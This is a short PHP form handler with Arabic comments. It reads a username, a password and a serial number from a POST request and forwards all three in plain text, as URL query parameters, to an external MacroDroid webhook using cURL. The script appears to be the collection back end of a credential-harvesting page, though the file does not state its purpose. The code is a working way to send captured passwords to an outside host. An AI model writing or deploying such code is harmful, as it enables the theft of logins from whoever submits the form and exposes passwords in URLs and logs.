<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال البيانات المرسلة عبر POST
    $sn = $_POST['sn'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // رابط الـ Webhook مع معلمات الـ URL
    $webhook_url = "https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=" . urlencode($username) . "&password=" . urlencode($password) . "&serial=" . urlencode($sn);

    // استخدام cURL لإرسال البيانات إلى Webhook
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // تنفيذ الطلب
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch); // عرض الأخطاء في حالة وجودها
    } else {
        echo "Data sent successfully to webhook.";
    }

    // إغلاق جلسة cURL
    curl_close($ch);
}
?>
